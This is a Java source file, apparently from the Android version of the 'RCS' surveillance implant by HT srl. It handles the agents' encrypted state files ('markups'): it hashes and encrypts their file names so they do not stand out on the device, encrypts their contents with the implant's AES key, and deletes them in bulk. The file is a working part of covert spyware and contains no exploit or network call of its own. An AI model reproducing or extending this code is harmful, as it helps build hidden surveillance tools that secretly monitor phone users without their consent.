/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : Markup.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.service.evidence;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectInput;
import java.io.ObjectInputStream;
import java.io.ObjectOutput;
import java.io.ObjectOutputStream;
import java.io.Serializable;

import com.android.service.agent.AgentType;
import com.android.service.auto.Cfg;
import com.android.service.crypto.CryptoException;
import com.android.service.crypto.Encryption;
import com.android.service.crypto.Keys;
import com.android.service.event.EventType;
import com.android.service.file.AutoFile;
import com.android.service.file.Path;
import com.android.service.util.Check;
import com.android.service.util.Utils;

/**
 * The Class Markup.
 */
public class Markup {

	private static final String TAG = "Markup";

	public static final String MARKUP_EXTENSION = ".qmm";
	public static byte markupSeed;
	public static boolean markupInit;
	private String agentId = "core";

	private String lognName;
	private AutoFile file;
	private Encryption encryption;

	private Markup() {
		encryption = new Encryption(Keys.self().getAesKey());
	}

	/**
	 * Instantiates a new markup.
	 * 
	 * @param agentId_
	 *            the agent id_
	 * @param aesKey
	 *            the aes key
	 */
	public Markup(final String agentId_) {
		this();
		agentId = agentId_;
	}
	
	public Markup(final Integer id) {
		this();
		agentId = id.toString();
	}

	/**
	 * Crea un markup vuoto.
	 * 
	 * @return true if successful
	 */
	public boolean createEmptyMarkup() {
		return writeMarkup(null);
	}

	/**
	 * 
	 * @param agentId
	 *            the agent id
	 * @param addPath
	 *            the add path
	 * @return the string
	 */
	static String makeMarkupName(String agentId, final boolean addPath) {
		// final String markupName = Integer.toHexString(agentId);
		String markupName = Utils.byteArrayToHex(Encryption.SHA1(agentId
				.getBytes()));
		if(Cfg.DEBUG) Check.requires(markupName != null, "null markupName");
		if(Cfg.DEBUG) Check.requires(markupName != "", "empty markupName");

		String encName = "";

		if (addPath) {
			encName = Path.markup();
		}

		encName += Encryption.encryptName(markupName + MARKUP_EXTENSION,
				getMarkupSeed());

		if(Cfg.DEBUG) Check.asserts(markupInit, "makeMarkupName: " + markupInit);
		return encName;
	}

	private static int getMarkupSeed() {
		if (!markupInit) {
			markupSeed = Keys.self().getAesKey()[0];
			markupInit = true;
		}

		return markupSeed;
	}

	/**
	 * Rimuove il file di markup relativo all'agente uAgentId. La funzione torna
	 * TRUE se il file e' stato rimosso o non e' stato trovato, FALSE se non e'
	 * stato possibile rimuoverlo.
	 * 
	 * @param value
	 *            the agent id_
	 * @return
	 */

	public static synchronized boolean removeMarkup(final String value) {

		final String markupName = makeMarkupName(value, true);

		if(Cfg.DEBUG) Check.asserts(markupName != "", "markupName empty");

		final AutoFile file = new AutoFile(markupName);
		if (file.exists()) {
			file.delete();
			return true;
		} else {
			return false;
		}
	}
	
	public static boolean removeMarkup(final Integer value) {
		return removeMarkup(value.toString());
	}

	/**
	 * Rimuove tutti i file di markup presenti sul filesystem.
	 * 
	 * @return
	 */

	public static synchronized int removeMarkups() {

		int numDeleted = 0;
		for (int type : AgentType.values()) {
			if (removeMarkup(type)) {
				numDeleted++;
			} else {
				if(Cfg.DEBUG) Check.log( TAG + " Error (removeMarkups): " + type);
			}
		}

		for (int type : EventType.values()) {
			if (removeMarkup(type)) {
				numDeleted++;
			} else {
				if(Cfg.DEBUG) Check.log( TAG + " Error (removeMarkups): " + type);
			}
		}

		return numDeleted;
	}

	/**
	 * Checks if is markup.
	 * 
	 * @return true, if is markup
	 */
	public synchronized boolean isMarkup() {
		if(Cfg.DEBUG) Check.requires(agentId != null, "agentId null");
		final String markupName = makeMarkupName(agentId, true);
		if(Cfg.DEBUG) Check.asserts(markupName != "", "markupName empty");

		final AutoFile fileRet = new AutoFile(markupName);
		return fileRet.exists();
	}

	/**
	 * Legge il file di markup specificato dall'AgentId (l'ID dell'agente che
	 * l'ha generato), torna un array di dati decifrati. Se il file non viene
	 * trovato o non e' possibile decifrarlo correttamente, torna null. Se il
	 * Markup e' vuoto restituisce un byte[0]. E' possibile creare dei markup
	 * vuoti, in questo caso non va usata la ReadMarkup() ma semplicemente la
	 * IsMarkup() per vedere se e' presente o meno.
	 * 
	 * @return the byte[]
	 * @throws IOException
	 *             Signals that an I/O exception has occurred.
	 */
	public synchronized byte[] readMarkup() throws IOException {
		if(Cfg.DEBUG) Check.requires(agentId != null, "agentId null");

		final String markupName = makeMarkupName(agentId, true);
		if(Cfg.DEBUG) Check.asserts(markupName != "", "markupName empty");

		final AutoFile fileRet = new AutoFile(markupName);

		if (fileRet.exists()) {
			final byte[] encData = fileRet.read();
			final int len = Utils.byteArrayToInt(encData, 0);

			byte[] plain = null;
			try {
				plain = encryption.decryptData(encData, len, 4);
			} catch (CryptoException e) {
				return null;
			}

			if(Cfg.DEBUG) Check.asserts(plain != null, "wrong decryption: null");
			if(Cfg.DEBUG) Check.asserts(plain.length == len, "wrong decryption: len");

			return plain;
		} else {
			if(Cfg.DEBUG) Check.log( TAG
					+ " Error (readMarkup): Markup file does not exists");
			return null;
		}
	}

	/**
	 * Removes the markup.
	 */
	public synchronized void removeMarkup() {
		if(Cfg.DEBUG) Check.requires(agentId != null, "agentId null");

		final String markupName = makeMarkupName(agentId, true);
		if(Cfg.DEBUG) Check.asserts(markupName != "", "markupName empty");

		final AutoFile remove = new AutoFile(markupName);
		remove.delete();
	}

	/**
	 * Scrive un file di markup per salvare lo stato dell'agente, il parametro
	 * e' il buffer di dati. Al termine della scrittura il file viene chiuso,
	 * non e' possibile fare alcuna Append e un'ulteriore chiamata alla
	 * WriteMarkup() comportera' la sovrascrittura del vecchio markup. La
	 * funzione torna TRUE se e' andata a buon fine, FALSE altrimenti. Il
	 * contenuto scritto e' cifrato.
	 * 
	 * @param data
	 *            the data
	 * @return true, if successful
	 */
	public synchronized boolean writeMarkup(final byte[] data) {
		final String markupName = makeMarkupName(agentId, true);

		if(Cfg.DEBUG) Check.asserts(markupName != "", "markupName empty");
		if (!Path.haveStorage()) {
			return false;
		}

		final AutoFile fileRet = new AutoFile(markupName);

		// se il file esiste viene azzerato
		fileRet.create();

		if (data != null) {
			final byte[] encData = encryption.encryptData(data);

			if(Cfg.DEBUG) Check.asserts(encData.length >= data.length, "strange data len");

			fileRet.write(data.length);
			fileRet.append(encData);
		}

		return fileRet.exists();
	}

	public synchronized boolean writeMarkupSerializable(
			final Serializable object) throws IOException {

		ByteArrayOutputStream bos = new ByteArrayOutputStream();
		ObjectOutput out = new ObjectOutputStream(bos);
		out.writeObject(object);
		byte[] data = bos.toByteArray();
		return writeMarkup(data);

	}

	public synchronized Object readMarkupSerializable() throws IOException {
		byte[] data = readMarkup();
		ByteArrayInputStream bis = new ByteArrayInputStream(data);
		ObjectInput in = new ObjectInputStream(bis);
		try {
			Object o = in.readObject();
			return o;
		} catch (ClassNotFoundException e) {
			if(Cfg.DEBUG) Check.log( TAG + " Error (readMarkupSerializable): " + e);
			throw new IOException();
		}
	}

}
